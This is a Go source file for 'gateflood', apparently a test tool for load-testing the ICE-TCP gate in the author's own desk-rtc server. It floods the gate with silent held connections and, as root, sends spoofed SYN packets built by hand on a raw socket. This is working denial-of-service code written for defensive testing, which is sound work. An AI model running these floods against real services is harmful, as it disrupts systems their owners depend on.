// Command gateflood floods desk-rtc's ICE-TCP gate (internal/rtcserver/tcpgate.go) for the box proof of 0.4.1's
// per-network places: connections that complete the handshake and then hold a place without sending, from as many
// source networks as asked, and, as root, forged SYNs from a network's addresses that never complete one. A real
// ICE-TCP client (deskctl --transport tcp) runs beside it; test/gateflood/box.sh drives both. Never point it at a desk
// that isn't yours: it's a denial-of-service tool by design.
//
//	gateflood --target 127.0.0.1:443 --sources 127.0.1.1,127.0.2.1,127.0.3.1 --workers 40 --duration 60s
//	gateflood --target 127.0.0.1:443 --hold-from 127.0.0.1 --hold 8 --duration 60s
//	gateflood --target 127.0.0.1:443 --syn-net 127.0.0.0/24 --syn-rate 20000 --duration 60s     # root
//
// Every second it prints a JSON line: per source, connections opened, open now, and how they ended (closed by the
// desk within 50 ms of opening, which is a refusal or a place taken back at once, or later, which is the first-packet
// deadline or a place taken back), and SYNs sent. The last line is the totals.
package main

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"math/rand/v2"
	"net"
	"net/netip"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

type source struct {
	Addr      string `json:"addr"`
	Opened    int64  `json:"opened"`
	Open      int64  `json:"open"`
	ClosedNow int64  `json:"closedWithin50ms"`
	ClosedLtr int64  `json:"closedLater"`
	DialErr   int64  `json:"dialErrors"`
	opened    atomic.Int64
	open      atomic.Int64
	closedNow atomic.Int64
	closedLtr atomic.Int64
	dialErr   atomic.Int64
}

func (s *source) snapshot() source {
	return source{Addr: s.Addr, Opened: s.opened.Load(), Open: s.open.Load(), ClosedNow: s.closedNow.Load(),
		ClosedLtr: s.closedLtr.Load(), DialErr: s.dialErr.Load()}
}

func main() {
	target := flag.String("target", "127.0.0.1:443", "desk-rtc's ICE-TCP address")
	sources := flag.String("sources", "", "comma-separated source addresses, one per flooding network")
	workers := flag.Int("workers", 40, "connections each source keeps trying to hold")
	send := flag.String("send", "none", "what each flooding connection sends: none, half (one byte of a length) or begun (a frame's length and part of it)")
	holdFrom := flag.String("hold-from", "", "a source that opens --hold silent connections once and keeps them (a household's places)")
	hold := flag.Int("hold", 0, "how many connections --hold-from keeps")
	synNet := flag.String("syn-net", "", "as root: forge SYNs from random addresses in this IPv4 prefix")
	synRate := flag.Int("syn-rate", 10000, "forged SYNs a second")
	duration := flag.Duration("duration", time.Minute, "how long to run; SIGTERM or SIGINT ends it sooner")
	flag.Parse()

	ctx, cancel := signal.NotifyContext(context.Background(), syscall.SIGTERM, syscall.SIGINT)
	defer cancel()
	ctx, cancel2 := context.WithTimeout(ctx, *duration)
	defer cancel2()

	var payload []byte
	switch *send {
	case "none":
	case "half":
		payload = []byte{0x00}
	case "begun":
		payload = []byte{0x00, 0x40, 0x00, 0x01}
	default:
		fail("--send is none, half or begun")
	}

	var srcs []*source
	var wg sync.WaitGroup
	if *sources != "" {
		for _, a := range strings.Split(*sources, ",") {
			s := &source{Addr: strings.TrimSpace(a)}
			srcs = append(srcs, s)
			for range *workers {
				wg.Add(1)
				go func() { defer wg.Done(); flood(ctx, *target, s, payload) }()
			}
		}
	}
	if *holdFrom != "" && *hold > 0 {
		s := &source{Addr: *holdFrom}
		srcs = append(srcs, s)
		for range *hold {
			wg.Add(1)
			go func() { defer wg.Done(); holdOne(ctx, *target, s) }()
		}
	}
	var syns atomic.Int64
	if *synNet != "" {
		p, err := netip.ParsePrefix(*synNet)
		if err != nil || !p.Addr().Is4() {
			fail("--syn-net wants an IPv4 prefix")
		}
		wg.Add(1)
		go func() { defer wg.Done(); forgeSYNs(ctx, *target, p.Masked(), *synRate, &syns) }()
	}

	enc := json.NewEncoder(os.Stdout)
	report := func(final bool) {
		out := map[string]any{"t": time.Now().UTC().Format(time.RFC3339), "final": final, "synsSent": syns.Load()}
		var ss []source
		for _, s := range srcs {
			ss = append(ss, s.snapshot())
		}
		out["sources"] = ss
		_ = enc.Encode(out)
	}
	tick := time.NewTicker(time.Second)
	defer tick.Stop()
	for done := false; !done; {
		select {
		case <-ctx.Done():
			done = true
		case <-tick.C:
			report(false)
		}
	}
	wg.Wait()
	report(true)
}

func fail(msg string) {
	fmt.Fprintln(os.Stderr, "gateflood:", msg)
	os.Exit(2)
}

func dial(target, src string) (net.Conn, error) {
	d := net.Dialer{LocalAddr: &net.TCPAddr{IP: net.ParseIP(src)}, Timeout: 3 * time.Second}

	return d.Dial("tcp4", target)
}

// waitClosed reads until the desk closes c or ctx ends, and reports whether the desk closed it.
func waitClosed(ctx context.Context, c net.Conn) bool {
	buf := make([]byte, 64)
	for ctx.Err() == nil {
		_ = c.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
		_, err := c.Read(buf)
		var ne net.Error
		if err != nil && !(errors.As(err, &ne) && ne.Timeout()) {
			return true
		}
	}

	return false
}

// flood holds one connection at a time from s, silent or with payload, and opens the next as soon as the desk closes
// it. A connection the desk closed at once waits 20 ms first, so a worker tries about 50 times a second.
func flood(ctx context.Context, target string, s *source, payload []byte) {
	for ctx.Err() == nil {
		c, err := dial(target, s.Addr)
		if err != nil {
			s.dialErr.Add(1)
			time.Sleep(20 * time.Millisecond)

			continue
		}
		s.opened.Add(1)
		s.open.Add(1)
		if len(payload) > 0 {
			_, _ = c.Write(payload)
		}
		start := time.Now()
		closed := waitClosed(ctx, c)
		_ = c.Close()
		s.open.Add(-1)
		if !closed {
			return
		}
		if time.Since(start) < 50*time.Millisecond {
			s.closedNow.Add(1)
			time.Sleep(20 * time.Millisecond)
		} else {
			s.closedLtr.Add(1)
		}
	}
}

// holdOne keeps one silent connection from s, and opens another when the desk closes it.
func holdOne(ctx context.Context, target string, s *source) {
	flood(ctx, target, s, nil)
}

// forgeSYNs sends SYNs to target from random addresses in p, which never answer the SYN-ACK: a raw IPv4 socket with
// the header written here (IPPROTO_RAW implies IP_HDRINCL). Needs CAP_NET_RAW.
func forgeSYNs(ctx context.Context, target string, p netip.Prefix, rate int, sent *atomic.Int64) {
	ap, err := netip.ParseAddrPort(target)
	if err != nil || !ap.Addr().Is4() {
		fail("--target must be an IPv4 address and port for --syn-net")
	}
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		fail("raw socket (run as root): " + err.Error())
	}
	defer syscall.Close(fd)
	dst := ap.Addr().As4()
	to := &syscall.SockaddrInet4{Addr: dst}
	base := p.Addr().As4()
	hostBits := 32 - p.Bits()
	pkt := make([]byte, 40)
	const batch = 100
	interval := time.Duration(int64(time.Second) * batch / int64(max(rate, 1)))
	tick := time.NewTicker(interval)
	defer tick.Stop()
	for ctx.Err() == nil {
		for range batch {
			src := base
			host := uint32(1 + rand.IntN(max(1<<hostBits-2, 1)))
			v := binary.BigEndian.Uint32(src[:]) | host
			binary.BigEndian.PutUint32(src[:], v)
			synPacket(pkt, src, dst, uint16(1024+rand.IntN(60000)), ap.Port(), rand.Uint32())
			if err := syscall.Sendto(fd, pkt, 0, to); err == nil {
				sent.Add(1)
			}
		}
		select {
		case <-ctx.Done():
		case <-tick.C:
		}
	}
}

// synPacket writes a 20-byte IPv4 header and a 20-byte TCP SYN into b.
func synPacket(b []byte, src, dst [4]byte, sport, dport uint16, seq uint32) {
	clear(b)
	b[0] = 0x45
	binary.BigEndian.PutUint16(b[2:], 40)
	binary.BigEndian.PutUint16(b[4:], uint16(rand.Uint32()))
	b[8] = 64
	b[9] = syscall.IPPROTO_TCP
	copy(b[12:16], src[:])
	copy(b[16:20], dst[:])
	binary.BigEndian.PutUint16(b[10:], checksum(b[:20], 0))
	t := b[20:]
	binary.BigEndian.PutUint16(t[0:], sport)
	binary.BigEndian.PutUint16(t[2:], dport)
	binary.BigEndian.PutUint32(t[4:], seq)
	t[12] = 5 << 4
	t[13] = 0x02 // SYN
	binary.BigEndian.PutUint16(t[14:], 64240)
	var pseudo uint32
	pseudo += uint32(binary.BigEndian.Uint16(src[0:])) + uint32(binary.BigEndian.Uint16(src[2:]))
	pseudo += uint32(binary.BigEndian.Uint16(dst[0:])) + uint32(binary.BigEndian.Uint16(dst[2:]))
	pseudo += syscall.IPPROTO_TCP + 20
	binary.BigEndian.PutUint16(t[16:], checksum(t[:20], pseudo))
}

func checksum(b []byte, sum uint32) uint16 {
	for i := 0; i+1 < len(b); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(b[i:]))
	}
	for sum>>16 != 0 {
		sum = sum&0xffff + sum>>16
	}

	return ^uint16(sum)
}
